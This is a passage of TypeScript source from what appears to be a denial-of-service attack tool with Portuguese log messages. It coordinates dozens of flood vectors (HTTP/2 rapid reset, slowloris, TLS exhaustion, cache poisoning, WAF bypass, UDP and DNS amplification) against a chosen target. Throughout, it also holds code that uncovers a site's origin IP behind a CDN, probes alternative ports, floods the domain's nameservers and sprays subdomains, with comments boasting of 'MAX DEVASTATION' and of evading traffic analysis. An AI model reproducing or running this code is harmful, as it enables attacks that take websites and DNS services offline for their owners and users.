          // ★ RATE LIMITED (4xx > 25%) — switch to gRPC + WAF bypass (different rate limit pools)
          void Promise.all([
            spawnPool("grpc-flood",       target, port, Math.round(grpcT  * 3.0), Math.min(grpcW, 8),   combined, onStats),
            spawnPool("waf-bypass",       target, port, Math.round(wafT   * 2.5), Math.min(wafW, 6),    combined, onStats),
            spawnPool("http-bypass",      target, port, Math.round(bypassT* 2.5), Math.min(bypassW, 6), combined, onStats),
            spawnPool("cache-poison",     target, port, Math.round(cacheT * 2.0), Math.min(cacheW, 4),  combined, onStats),
            spawnPool("graphql-dos",      target, port, Math.round(gqlT   * 2.0), Math.min(gqlW, 4),    combined, onStats),
            spawnPool("app-smart-flood",  target, port, Math.round(appT   * 2.0), Math.min(appW, 6),    combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        } else if (wave % 3 === 0) {
          // ★ MAX DEVASTATION wave — all top vectors at 2.5× (every 3rd wave)
          void Promise.all([
            spawnPool("http2-flood",        target, port, Math.round(h2T    * 2.5), Math.min(h2W, 8),    combined, onStats),
            spawnPool("h2-rst-burst",       target, port, Math.round(rstT   * 2.5), Math.min(rstW, 8),   combined, onStats),
            spawnPool("http-pipeline",      target, port, Math.round(pipeT  * 2.5), Math.min(pipeW, 8),  combined, onStats),
            spawnPool("h2-settings-storm",  target, port, Math.round(stormT * 2.5), Math.min(stormW, 8), combined, onStats),
            spawnPool("app-smart-flood",    target, port, Math.round(appT   * 2.5), Math.min(appW, 8),   combined, onStats),
            spawnPool("large-header-bomb",  target, port, Math.round(lhbT   * 2.5), Math.min(lhbW, 8),  combined, onStats),
            spawnPool("h2-ping-storm",      target, port, Math.round(pingT  * 2.5), Math.min(pingW, 4),  combined, onStats),
            spawnPool("waf-bypass",         target, port, Math.round(wafT   * 2.0), Math.min(wafW, 4),   combined, onStats),
            spawnPool("hpack-bomb",         target, port, Math.round(hpackT * 2.0), Math.min(hpackW, 4), combined, onStats),
            spawnPool("grpc-flood",         target, port, Math.round(grpcT  * 2.0), Math.min(grpcW, 4),  combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        } else if (wave % 2 === 0) {
          // ★ App/TLS heavy wave — DB + crypto exhaustion (2.2×)
          void Promise.all([
            spawnPool("app-smart-flood",      target, port, Math.round(appT  * 2.2), Math.min(appW, 8),  combined, onStats),
            spawnPool("large-header-bomb",    target, port, Math.round(lhbT  * 2.2), Math.min(lhbW, 8), combined, onStats),
            spawnPool("http2-priority-storm", target, port, Math.round(prioT * 2.2), Math.min(prioW, 6), combined, onStats),
            spawnPool("keepalive-exhaust",    target, port, Math.round(kaT   * 2.2), Math.min(kaW, 4),   combined, onStats),
            spawnPool("http-smuggling",       target, port, Math.round(smugT * 2.2), Math.min(smugW, 4), combined, onStats),
            spawnPool("tls-renego",           target, port, Math.round(tlsT  * 2.0), Math.min(tlsW, 4),  combined, onStats),
            spawnPool("ssl-death",            target, port, Math.round(sslT  * 2.0), Math.min(sslW, 4),  combined, onStats),
            spawnPool("grpc-flood",           target, port, Math.round(grpcT * 2.0), Math.min(grpcW, 4), combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        } else {
          // ★ H2/Protocol heavy wave — bandwidth + H2 state exhaustion (2.0×)
          void Promise.all([
            spawnPool("http2-flood",       target, port, Math.round(h2T    * 2.0), Math.min(h2W, 8),    combined, onStats),
            spawnPool("h2-rst-burst",      target, port, Math.round(rstT   * 2.0), Math.min(rstW, 8),   combined, onStats),
            spawnPool("http-pipeline",     target, port, Math.round(pipeT  * 2.0), Math.min(pipeW, 8),  combined, onStats),
            spawnPool("h2-settings-storm", target, port, Math.round(stormT * 2.0), Math.min(stormW, 8), combined, onStats),
            spawnPool("http2-continuation",target, port, Math.round(contT  * 2.0), Math.min(contW, 8),  combined, onStats),
            spawnPool("h2-ping-storm",     target, port, Math.round(pingT  * 2.0), Math.min(pingW, 4),  combined, onStats),
            spawnPool("http2-priority-storm",target,port, Math.round(prioT * 1.8), Math.min(prioW, 4),  combined, onStats),
          ]).finally(() => clearTimeout(burstTimer));
        }
        // ★ Random rest duration — defeats steady-state traffic analysis
        await new Promise<void>(r => setTimeout(r, restMs));
      }
    };
    // Burst mode: deployed only — in dev, extra workers would cause OOM
    if (IS_DEPLOYED) void burstLoop();

    // ── ORIGIN IP PIVOT — runs concurrently with the main 43-vector flood ──
    // Auto-discovers the real origin IP behind Cloudflare/CDN.
    // When found: redirects the FULL thread budget (100%) to direct origin attack,
    // completely bypassing all CDN/WAF filtering. CDN can't protect an IP that
    // isn't behind it. Main 43-vector attack continues in parallel → maximum pressure.
    // ──────────────────────────────────────────────────────────────────────────
    const geassHostname = target.replace(/^https?:\/\//i, "").split("/")[0].split(":")[0];
    const originPivotTask = (async () => {
      try {
        const cdnIPs_g = await dnsP.resolve4(geassHostname).catch(() => [] as string[]);
        const originIP_g = await _findOriginIPForAttack(geassHostname, cdnIPs_g).catch(() => null);
        if (originIP_g && !signal.aborted) {
          console.log(`[geass-override] ✓ ORIGIN PIVOT ATIVADO: ${originIP_g} — multi-porta + NS flood iniciando`);

          // Store for panel display
          if (id != null) liveOriginIP.set(id, originIP_g);

          const oT = threads;
          const oW = Math.max(6, CPU_COUNT);

          // ── Phase 1: core origin vectors on ports 80 + 443 ─────────────────
          const phase1 = Promise.all([
            spawnPool("h2-rst-burst",  originIP_g, 443, Math.ceil(oT * 0.35), oW,                              signal, onStats, undefined, geassHostname),
            spawnPool("http-pipeline", originIP_g, 80,  Math.ceil(oT * 0.35), oW,                              signal, onStats, undefined, geassHostname),
            spawnPool("waf-bypass",    originIP_g, 443, Math.ceil(oT * 0.30), Math.max(4, Math.floor(CPU_COUNT/2)+2), signal, onStats, undefined, geassHostname),
            spawnPool("conn-flood",    originIP_g, 443, Math.ceil(oT * 0.20), 1,                                signal, onStats, undefined, geassHostname),
            spawnPool("slowloris",     originIP_g, 80,  Math.ceil(oT * 0.20), 1,                                signal, onStats, undefined, geassHostname),
            spawnPool("ssl-death",     originIP_g, 443, Math.ceil(oT * 0.15), 2,                                signal, onStats, undefined, geassHostname),
            spawnPool("http2-flood",   originIP_g, 443, Math.ceil(oT * 0.25), Math.max(4, CPU_COUNT),           signal, onStats, undefined, geassHostname),
            spawnPool("http-bypass",   originIP_g, 443, Math.ceil(oT * 0.20), Math.max(3, Math.floor(CPU_COUNT/2)), signal, onStats, undefined, geassHostname),
            spawnPool("tls-renego",    originIP_g, 443, Math.ceil(oT * 0.15), Math.max(3, Math.floor(CPU_COUNT/2)), signal, onStats, undefined, geassHostname),
          ]).catch(() => {});

          // ── Phase 2: multi-port expansion — many origins expose alt ports ──
          // Probe which alt ports are open (quick TCP connect), then flood those too
          const ALT_PORTS = [8080, 8443, 3000, 8000, 5000];
          const altPortTasks = ALT_PORTS.map(altPort =>
            new Promise<void>(resolvePort => {
              const sock = new net.Socket();
              sock.setTimeout(2500);
              sock.connect(altPort, originIP_g, () => {
                sock.destroy();
                if (!signal.aborted) {
                  const useHttps = altPort === 8443;
                  console.log(`[geass-override] Alt port ${altPort} open on ${originIP_g} — flooding`);
                  void spawnPool(
                    useHttps ? "h2-rst-burst" : "http-pipeline",
                    originIP_g, altPort, Math.ceil(oT * 0.25), Math.max(3, Math.floor(CPU_COUNT/2)),
                    signal, onStats, undefined, geassHostname
                  ).catch(() => {});
                  void spawnPool(
                    "conn-flood", originIP_g, altPort, Math.ceil(oT * 0.15), 1,
                    signal, onStats, undefined, geassHostname
                  ).catch(() => {});
                }
                resolvePort();
              });
              sock.on("error", () => { sock.destroy(); resolvePort(); });
              sock.on("timeout", () => { sock.destroy(); resolvePort(); });
            })
          );

          // ── Phase 3: NS flood — flood the domain's nameservers ─────────────
          // If NS goes down or gets saturated, CDN cannot renew DNS lookups
          const nsFloodTask = (async () => {
            try {
              const nsRecords = await dnsP.resolveNs(geassHostname).catch(() => [] as string[]);
              const nsAll = nsRecords.length > 0 ? nsRecords
                : await dnsP.resolveNs(geassHostname.split(".").slice(-2).join(".")).catch(() => [] as string[]);
              if (nsAll.length === 0) return;
              console.log(`[geass-override] NS flood: targeting ${nsAll.join(", ")}`);
              const nsIps = (await Promise.allSettled(nsAll.map(ns => dnsP.resolve4(ns).catch(() => [] as string[]))))
                .flatMap(r => r.status === "fulfilled" ? r.value : [])
                .filter(ip => !_isCFIP(ip));
              if (nsIps.length === 0) return;
              for (const nsIp of nsIps.slice(0, 4)) {
                if (signal.aborted) break;
                console.log(`[geass-override] NS flood → ${nsIp}:53`);
                void spawnPool("dns-amp", nsIp, 53, Math.ceil(oT * 0.20), 1, signal, onStats).catch(() => {});
                void spawnPool("udp-flood", nsIp, 53, Math.ceil(oT * 0.15), 1, signal, onStats).catch(() => {});
              }
            } catch { /* NS flood is best-effort */ }
          })();

          void Promise.all([phase1, ...altPortTasks, nsFloodTask]).catch(() => {});
        } else if (!signal.aborted) {
          console.log(`[geass-override] ✗ Origin IP não encontrado — mantendo ataque CDN completo`);
        }
      } catch { /* ignore — origin pivot is best-effort */ }
    })();
    void originPivotTask;

    await geassPromise;
    return;
  }

  // ─────────────────────────────────────────────────────────────────────────
  //  BYPASS STORM — focused 7-vector WAF/Cloudflare composite
  //  Less RAM than geass-override, tuned specifically for CF/Akamai bypasses
  // ─────────────────────────────────────────────────────────────────────────
  if (method === "bypass-storm") {
    const wafW  = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);
    const h2W   = Math.max(4, CPU_COUNT);
    const contW = Math.max(3, Math.floor(CPU_COUNT * 0.75));
    const hpackW= Math.max(3, Math.floor(CPU_COUNT / 2));
    const smugW = 2;
    const bypassW = Math.max(3, Math.floor(CPU_COUNT / 2));
    const cacheW = 2;

    const wafT    = Math.max(600, Math.round(threads * 0.45));
    const h2T     = Math.max(800, Math.round(threads * 0.65));
    const contT   = Math.max(500, Math.round(threads * 0.40));
    const hpackT  = Math.max(400, Math.round(threads * 0.35));
    const smugT   = Math.max(80,  Math.round(threads * 0.05));
    const bypassT = Math.max(300, Math.round(threads * 0.25));
    const cacheT  = Math.max(80,  Math.round(threads * 0.05));

    await Promise.all([
      spawnPool("waf-bypass",         target, port, wafT,    wafW,    signal, onStats),
      spawnPool("h2-rst-burst",       target, port, h2T,     h2W,    signal, onStats),
      spawnPool("http2-continuation", target, port, contT,   contW,  signal, onStats),
      spawnPool("hpack-bomb",         target, port, hpackT,  hpackW, signal, onStats),
      spawnPool("http-smuggling",     target, port, smugT,   smugW,  signal, onStats),
      spawnPool("http-bypass",        target, port, bypassT, bypassW,signal, onStats),
      spawnPool("cache-poison",       target, port, cacheT,  cacheW, signal, onStats),
    ]);
    return;
  }

  // ─────────────────────────────────────────────────────────────────────────
  //  ORIGIN BYPASS — Dual-Front CDN Bypass
  //  Front 1 (70%): Auto-discover origin IP → attack directly (bypasses CDN)
  //    http-pipeline + conn-flood + h2-rst-burst + slowloris + ssl-death on origin IP
  //  Front 2 (30%): CDN edge exhaustion
  //    cache-poison + waf-bypass forces 100% origin miss rate on all CDN edges
  //  Auto-discovery: subdomain enum + IPv6 AAAA + SPF + MX records
  //  Fallback: bypass-storm + waf-bypass if origin IP not found
  // ─────────────────────────────────────────────────────────────────────────
  if (method === "origin-bypass") {
    const hostname = target
      .replace(/^https?:\/\//i, "").split("/")[0].split(":")[0];

    // Resolve CDN IPs (to filter them out when looking for origin)
    const cdnIPs = await dnsP.resolve4(hostname).catch(() => [] as string[]);

    // Auto-discover origin IP
    const originIP = await _findOriginIPForAttack(hostname, cdnIPs).catch(() => null);

    if (originIP) {
      console.log(`[origin-bypass] ✓ Origin IP: ${originIP} — tri-front attack started (origin+CDN+purge)`);
      // 75% threads → direct origin attack (bypasses CDN/WAF entirely)
      const originT    = Math.ceil(threads * 0.75);
      const pipeT_ob   = Math.ceil(originT * 0.18);  // HTTP/1.1 pipeline — raw TCP saturation
      const connT_ob   = Math.ceil(originT * 0.12);  // connection table exhaustion (no rate limit)
      const h2rstT_ob  = Math.ceil(originT * 0.18);  // H2 RST burst — CVE-2023-44487 on naked origin
      const rstT_ob    = Math.ceil(originT * 0.18);  // rapid-reset ultra — sustained H2 stream storm
      const appT_ob    = Math.ceil(originT * 0.14);  // app-smart-flood — DB query exhaustion
      const slowT_ob   = Math.ceil(originT * 0.07);  // slowloris — fills accept() queue
      const sslT_ob    = Math.max(50, originT - pipeT_ob - connT_ob - h2rstT_ob - rstT_ob - appT_ob - slowT_ob);

      // 25% threads → CDN edge exhaustion + forced cache invalidation
      const cdnT       = Math.max(100, threads - originT);
      const cacheT_ob  = Math.ceil(cdnT * 0.40);  // cache poison — unique keys force 100% origin miss
      const purgeT_ob  = Math.ceil(cdnT * 0.25);  // cdn-purge-flood — invalidates cached entries
      const wafT_ob    = Math.max(80, cdnT - cacheT_ob - purgeT_ob);

      await Promise.all([
        // ── Front 1: direct origin IP attack (SNI=hostname bypasses CDN, RFC-6066)
        spawnPool("http-pipeline",   originIP, 80,  pipeT_ob,  Math.max(4, CPU_COUNT),                    signal, onStats, undefined, hostname),
        spawnPool("conn-flood",      originIP, 443, connT_ob,  1,                                          signal, onStats, undefined, hostname),
        spawnPool("h2-rst-burst",    originIP, 443, h2rstT_ob, Math.max(4, CPU_COUNT),                    signal, onStats, undefined, hostname),
        spawnPool("rapid-reset",     originIP, 443, rstT_ob,   Math.max(4, CPU_COUNT),                    signal, onStats, undefined, hostname),
        spawnPool("app-smart-flood", originIP, 80,  appT_ob,   Math.max(4, Math.floor(CPU_COUNT / 2) + 2),signal, onStats, undefined, hostname),
        spawnPool("slowloris",       originIP, 80,  slowT_ob,  1,                                          signal, onStats, undefined, hostname),
        spawnPool("ssl-death",       originIP, 443, sslT_ob,   2,                                          signal, onStats, undefined, hostname),
        // ── Front 2: CDN edge exhaustion + cache invalidation (makes CDN useless) ─────
        spawnPool("cache-poison",    target, port, cacheT_ob, 2,                                           signal, onStats),
        spawnPool("cdn-purge-flood", target, port, purgeT_ob, 2,                                           signal, onStats),
        spawnPool("waf-bypass",      target, port, wafT_ob,   Math.max(4, Math.floor(CPU_COUNT / 2) + 2), signal, onStats),
      ]);
      return;
    } else {
      console.log(`[origin-bypass] ✗ No origin IP found — fallback 6-vector storm`);
      // Fallback: 6 simultaneous vectors — covers H2, WAF evasion, cache and app layers
      const wafFallT   = Math.max(400, Math.ceil(threads * 0.45));
      const rstFallT   = Math.max(300, Math.ceil(threads * 0.40));
      const h2FallT    = Math.max(200, Math.ceil(threads * 0.35));
      const appFallT   = Math.max(200, Math.ceil(threads * 0.35));
      const cacheFallT = Math.max(100, Math.ceil(threads * 0.20));
      const purgeFallT = Math.max(80,  Math.ceil(threads * 0.15));
      await Promise.all([
        spawnPool("waf-bypass",      target, port, wafFallT,   Math.max(4, Math.floor(CPU_COUNT / 2) + 2), signal, onStats),
        spawnPool("rapid-reset",     target, port, rstFallT,   Math.max(4, CPU_COUNT),                     signal, onStats),
        spawnPool("h2-storm",        target, port, h2FallT,    Math.max(4, CPU_COUNT),                     signal, onStats),
        spawnPool("app-smart-flood", target, port, appFallT,   Math.max(4, Math.floor(CPU_COUNT / 2) + 2), signal, onStats),
        spawnPool("cache-poison",    target, port, cacheFallT, 2,                                           signal, onStats),
        spawnPool("cdn-purge-flood", target, port, purgeFallT, 2,                                           signal, onStats),
      ]);
      return;
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  //  DNS NS FLOOD — Direct authoritative NS server attack
  //  Bypasses CDN/WAF entirely. Resolves NS records, floods each NS IP with
  //  A+MX+TXT+SOA random-label queries. Destroys DNS resolution for target domain.
  // ─────────────────────────────────────────────────────────────────────────
  if (method === "dns-ns-flood") {
    await spawnPool("dns-ns-flood", target, port, threads, 1, signal, onStats);
    return;
  }

  // ─────────────────────────────────────────────────────────────────────────
  //  GEASS ABSOLUTUM ∞ — Maximum force: 4 simultaneous fronts
  //  Front A (CDN/Host): 13 vectors — STARTS IMMEDIATELY, no waiting
  //  Front B (Origin):   Added dynamically when origin IP is discovered
  //  Front C (DNS):      NS flood kills domain resolution
  //  Front D (Spray):    Subdomain spray across all CDN PoPs (deploy only)
  //
  //  Origin discovery + NS direct run concurrently with attack already live.
  //  User sees stats within 1-2s. Origin front joins ~5-20s in when found.
  // ─────────────────────────────────────────────────────────────────────────
  if (method === "geass-absolutum") {
    const hostname_ab = target.replace(/^https?:\/\//i, "").split("/")[0].split(":")[0];
    const baseDomain  = hostname_ab.split(".").slice(-2).join(".");

    // Deploy-aware worker multiplier — 6× scale in deployment
    const W = (base: number) => IS_DEPLOYED ? Math.max(base * 6, CPU_COUNT * 4) : Math.max(base, CPU_COUNT);

    // Thread allocation — origin budget always reserved even before discovery
    const dnsT_ab    = Math.max(50,  Math.round(threads * (IS_DEPLOYED ? 0.03 : 0.04)));
    const sprayT_ab  = IS_DEPLOYED ? Math.round(threads * 0.10) : 0;
    const originT_ab = Math.max(200, Math.round(threads * (IS_DEPLOYED ? 0.20 : 0.25)));
    const kaT_ab     = Math.max(80,  Math.round(threads * (IS_DEPLOYED ? 0.05 : 0.04)));
    const purgeT_ab  = Math.max(100, Math.round(threads * (IS_DEPLOYED ? 0.06 : 0.05)));
    const cdnT_ab    = threads - dnsT_ab - sprayT_ab - originT_ab - kaT_ab - purgeT_ab;

    const rrT_ab   = Math.max(600,  Math.round(cdnT_ab * 0.55));
    const wafT_ab  = Math.max(500,  Math.round(cdnT_ab * 0.45));
    const h2T_ab   = Math.max(600,  Math.round(cdnT_ab * 0.50));
    const appT_ab  = Math.max(400,  Math.round(cdnT_ab * 0.35));
    const tlsT_ab  = Math.max(150,  Math.round(cdnT_ab * 0.10));
    const connT_ab = Math.max(200,  Math.round(cdnT_ab * 0.12));
    const pipeT_ab = Math.max(1000, Math.round(cdnT_ab * 0.70));
    const sseT_ab  = Math.max(80,   Math.round(cdnT_ab * 0.06));
    const udpT_ab  = Math.max(100,  Math.round(cdnT_ab * 0.08));
    const h3T_ab   = Math.max(100,  Math.round(cdnT_ab * 0.08));

    console.log(`[geass-absolutum] ∞ INICIANDO — ${threads} threads — CDN fronts ativos AGORA, origin discovery em paralelo...`);

    // Thread budget for cdn-slow-exhaust (CDN pool exhaustion)
    const slowExT_ab = Math.max(100, Math.round(threads * (IS_DEPLOYED ? 0.06 : 0.05)));
    const cdnT_actual = threads - dnsT_ab - sprayT_ab - originT_ab - kaT_ab - purgeT_ab - slowExT_ab;
    const rrT_adj   = Math.max(600,  Math.round(cdnT_actual * 0.55));
    const wafT_adj  = Math.max(500,  Math.round(cdnT_actual * 0.45));
    const h2T_adj   = Math.max(600,  Math.round(cdnT_actual * 0.50));
    const appT_adj  = Math.max(400,  Math.round(cdnT_actual * 0.35));
    const tlsT_adj  = Math.max(150,  Math.round(cdnT_actual * 0.10));
    const connT_adj = Math.max(200,  Math.round(cdnT_actual * 0.12));
    const pipeT_adj = Math.max(1000, Math.round(cdnT_actual * 0.70));
    const sseT_adj  = Math.max(80,   Math.round(cdnT_actual * 0.06));
    const udpT_adj  = Math.max(100,  Math.round(cdnT_actual * 0.08));
    const h3T_adj   = Math.max(100,  Math.round(cdnT_actual * 0.08));

    // ── Front A: CDN/Host — 14 vectors — STARTS RIGHT NOW ─────────────────
    const immediateFronts: Promise<void>[] = [
      spawnPool("rapid-reset",         target, port, rrT_adj,    W(4), signal, onStats),
      spawnPool("waf-bypass",          target, port, wafT_adj,   W(3), signal, onStats),
      spawnPool("h2-storm",            target, port, h2T_adj,    W(4), signal, onStats),
      spawnPool("app-smart-flood",     target, port, appT_adj,   W(3), signal, onStats),
      spawnPool("tls-session-exhaust", target, port, tlsT_adj,   IS_DEPLOYED ? Math.max(8, CPU_COUNT * 2) : 1, signal, onStats),
      spawnPool("conn-flood",          target, port, connT_adj,  IS_DEPLOYED ? Math.max(8, CPU_COUNT * 2) : 1, signal, onStats),
      spawnPool("http-pipeline",       target, port, pipeT_adj,  W(4), signal, onStats),
      spawnPool("sse-exhaust",         target, port, sseT_adj,   IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
      spawnPool("udp-flood",           target, port, udpT_adj,   IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
      spawnPool("h3-rapid-reset",      target, port, h3T_adj,    W(4), signal, onStats),
      spawnPool("keepalive-exhaust",   target, port, kaT_ab,    IS_DEPLOYED ? Math.max(6, CPU_COUNT) : 1, signal, onStats),
      spawnPool("cdn-purge-flood",     target, port, purgeT_ab, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
      spawnPool("dns-ns-flood",        target, port, dnsT_ab,   IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
      // ★ CDN pool exhaustion — COMPLETE POST requests trickled to exhaust origin connection pool
      spawnPool("cdn-slow-exhaust",    target, port, slowExT_ab, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
      // ★ H2 Multiplex — true persistent stream pooling: 150 sessions x 128 streams = 19,200 concurrent
      //   10x less RAM than HTTP/1.1, more CPU on server, bypasses per-IP connection limits
      spawnPool("h2-multiplex",        target, port, Math.max(IS_DEPLOYED ? 150 : 20, Math.round(cdnT_actual * 0.12)), IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1, signal, onStats),
    ];

    // ── Front D: Subdomain Spray (deploy only) — STARTS RIGHT NOW ─────────
    if (IS_DEPLOYED) {
      const SPRAY_SUBS = ["www","api","cdn","static","assets","media","img","app","m","mail"];
      const sprayTargets = SPRAY_SUBS.map(s => `https://${s}.${baseDomain}`).filter(u => u !== target);
      if (sprayTargets.length > 0) {
        const tPerSub = Math.max(200, Math.floor(sprayT_ab / sprayTargets.length));
        for (const sub of sprayTargets) {
          immediateFronts.push(
            spawnPool("waf-bypass",    sub, port, Math.ceil(tPerSub * 0.5), W(2), signal, onStats),
            spawnPool("rapid-reset",   sub, port, Math.ceil(tPerSub * 0.3), W(2), signal, onStats),
            spawnPool("http-pipeline", sub, port, Math.ceil(tPerSub * 0.2), W(2), signal, onStats),
          );
        }
      }
    }

    // ── Front B + C: Origin discovery + NS direct — run concurrently ──────
    // These add new pools dynamically while the attack is already in progress.
    const asyncFrontsPromise = (async () => {
      const extraFronts: Promise<void>[] = [];

      // Origin IP discovery (runs while attack is live)
      try {
        const cdnIPs_ab   = await dnsP.resolve4(hostname_ab).catch(() => [] as string[]);
        const originIP_ab = await _findOriginIPForAttack(hostname_ab, cdnIPs_ab).catch(() => null);
        if (originIP_ab && !signal.aborted) {
          console.log(`[geass-absolutum] ✓ Front B ATIVO: origin ${originIP_ab} — bypass CDN total`);
          const pT = Math.ceil(originT_ab * 0.30);
          const cT = Math.ceil(originT_ab * 0.20);
          const rT = Math.ceil(originT_ab * 0.20);
          const sT = Math.ceil(originT_ab * 0.15);
          const xT = Math.max(50, originT_ab - pT - cT - rT - sT);
          extraFronts.push(
            spawnPool("http-pipeline", originIP_ab, 80,  pT, W(4),                                        signal, onStats, undefined, hostname_ab),
            spawnPool("conn-flood",    originIP_ab, 443, cT, IS_DEPLOYED ? Math.max(8, CPU_COUNT * 2) : 1, signal, onStats, undefined, hostname_ab),
            spawnPool("h2-rst-burst",  originIP_ab, 443, rT, W(4),                                        signal, onStats, undefined, hostname_ab),
            spawnPool("slowloris",     originIP_ab, 80,  sT, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 1,    signal, onStats, undefined, hostname_ab),
            spawnPool("ssl-death",     originIP_ab, 443, xT, IS_DEPLOYED ? Math.max(4, CPU_COUNT) : 2,    signal, onStats, undefined, hostname_ab),
          );
        } else {
          console.log("[geass-absolutum] ✗ Origin não encontrado — somente fronts CDN+DNS");
        }
      } catch { /* ignore */ }

      // NS direct attack — resolve NS IPs and flood them directly (deploy only)
      if (IS_DEPLOYED && !signal.aborted) {
        try {
          const nsNames   = await dnsP.resolveNs(baseDomain).catch(() => [] as string[]);
          const nsIpLists = await Promise.allSettled(nsNames.slice(0, 4).map(ns => dnsP.resolve4(ns).catch(() => [] as string[])));
          const nsIPs: string[] = [];
          for (const r of nsIpLists) if (r.status === "fulfilled") nsIPs.push(...r.value);
          if (nsIPs.length > 0 && !signal.aborted) {
            console.log(`[geass-absolutum] Front C NS direto: ${nsIPs.join(", ")}`);
            const nsT = Math.max(200, Math.round(dnsT_ab / Math.max(nsIPs.length, 1)));
            for (const ip of nsIPs.slice(0, 6)) {
              extraFronts.push(spawnPool("dns-ns-flood", ip, 53, nsT, Math.max(2, CPU_COUNT), signal, onStats));
            }
          }
        } catch { /* NS resolution failed */ }
      }

      if (extraFronts.length > 0) await Promise.all(extraFronts);
    })();

    await Promise.all([...immediateFronts, asyncFrontsPromise]);
    return;
  }

  // ─────────────────────────────────────────────────────────────────────────
  //  GEASS ULTIMA — Final Form: 10 simultaneous vectors across every OSI layer
  //  Each worker independently runs all 10 vectors → CPU_COUNT × 10 vectors total
  // ─────────────────────────────────────────────────────────────────────────
  if (method === "geass-ultima") {
    // OOM-safe worker counts for geass-ultima.
    // Deployed (8 vCPU / 32GB): 6 workers per stateless pool.
    //   6×9 stateless pools + 1×4 socket-holding pools = ~58 total → within MAX_TOTAL_WORKERS=64.
    //   All 11 vectors launch. Old formula (W(4)=24 per pool × 11 = 264 workers → OOM).
    // Dev: CPU_COUNT workers per pool, capped by global MAX_TOTAL_WORKERS=48.
    const W = (base: number) => IS_DEPLOYED ? Math.min(CPU_COUNT, 6) : Math.max(base, CPU_COUNT);

    const rrW    = W(4);   // Rapid Reset Ultra   — stateless, scales well: 6 in deploy
    const wafW   = W(3);   // WAF Bypass          — stateless per request: 6 in deploy
    const h2W    = W(4);   // H2 Storm (6 sub-v)  — stateless framing: 6 in deploy
    const appW   = W(3);   // App Smart Flood     — adaptive L7: 6 in deploy
    const tlsW   = 1;      // TLS Exhaust         — socket-holding (1 is enough, holds many)
    const connW  = 1;      // Conn Flood          — socket-holding (1 is enough)
    const pipeW  = W(4);   // HTTP Pipeline       — stateless, highest throughput: 6 in deploy
    const sseW   = 1;      // SSE Exhaust         — persistent conn hold: 1 is enough
    const udpW   = 1;      // UDP Flood           — single raw socket pool per worker

    const rrT    = Math.max(800,  Math.round(threads * 0.55)); // ★★★★★ Rapid Reset (highest priority)
    const wafT   = Math.max(600,  Math.round(threads * 0.45)); // ★★★★ WAF Bypass
    const h2T    = Math.max(700,  Math.round(threads * 0.50)); // ★★★★ H2 Storm
    const appT   = Math.max(500,  Math.round(threads * 0.35)); // ★★★ App Smart Flood
    const tlsT   = Math.max(200,  Math.round(threads * 0.12)); // TLS Session
    const connT  = Math.max(300,  Math.round(threads * 0.15)); // Conn Flood
    const pipeT  = Math.max(1200, Math.round(threads * 0.70)); // ★★★★ HTTP Pipeline
    const sseT   = Math.max(100,  Math.round(threads * 0.08)); // SSE Exhaust
    const udpT   = Math.max(200,  Math.round(threads * 0.10)); // UDP Flood

    const dnsNsT = Math.max(50,  Math.round(threads * 0.04)); // DNS NS Flood [V10] — authoritative NS
    const h3T    = Math.max(100, Math.round(threads * 0.08)); // H3 Rapid Reset [V11] — QUIC/UDP

    await Promise.all([
      spawnPool("rapid-reset",        target, port, rrT,    rrW,   signal, onStats),
      spawnPool("waf-bypass",         target, port, wafT,   wafW,  signal, onStats),
      spawnPool("h2-storm",           target, port, h2T,    h2W,   signal, onStats),
      spawnPool("app-smart-flood",    target, port, appT,   appW,  signal, onStats),
      spawnPool("tls-session-exhaust",target, port, tlsT,   tlsW,  signal, onStats),
      spawnPool("conn-flood",         target, port, connT,  connW, signal, onStats),
      spawnPool("http-pipeline",      target, port, pipeT,  pipeW, signal, onStats),
      spawnPool("sse-exhaust",        target, port, sseT,   sseW,  signal, onStats),
      spawnPool("udp-flood",          target, port, udpT,   udpW,  signal, onStats),
      spawnPool("dns-ns-flood",       target, port, dnsNsT, 1,     signal, onStats), // [V10] NS destruction
      spawnPool("h3-rapid-reset",     target, port, h3T,    Math.max(4, CPU_COUNT), signal, onStats), // [V11] QUIC/H3
    ]);
    return;
  }

  // All other real-network methods: single pool of CPU_COUNT workers (1 in dev)
  await spawnPool(method, target, port, threads, CPU_COUNT, signal, onStats);
}

// ── Static method catalogue ───────────────────────────────────────────────
const METHODS_CATALOGUE = [
  // Hydra / Special
  { id: "geass-absolutum",      name: "Geass Absolutum ∞ [4 FRONTES — 20v+]",  layer: "ALL",  protocol: "TCP/UDP/H2/H3/TLS/DNS",tier: "ARES",   description: "PODER MÁXIMO — 4 frentes: [A] CDN/Host 11v com workers 6× escalados; [B] Origin IP direto (bypassa CDN); [C] DNS NS destruction; [D] Subdomain Spray 10 subdomínios (deploy only — força mitigação em todos os PoPs CDN). Burst 12000, KA 4096 sockets." },
  { id: "geass-override",       name: "Geass Override ∞ [ARES 42v]",          layer: "ALL",  protocol: "TCP/UDP/H2/H3/TLS",    tier: "ARES",   description: "MAX POWER — 42 simultaneous attack vectors: H3-RapidReset(CVE-44487)+QUIC+H2-RST+H2-CONTINUATION(CVE-27316)+H2-Settings+Pipeline+Slowloris+HPACK+WAF+TLS+WS-Deflate+DNS+gRPC+..." },
  { id: "geass-ultima",         name: "Geass Ultima ∞ [11v — H3+DNS NS]",      layer: "ALL",  protocol: "TCP/UDP/H2/H3/TLS/DNS",tier: "ARES",   description: "FORMA FINAL — 11 vetores simultâneos: RapidReset+WAFBypass+H2Storm(6v)+AppFlood+TLSExhaust+ConnFlood+Pipeline+SSE+UDP+H3/QUIC+DNS-NS. Zero delay, toda stack OSI" },
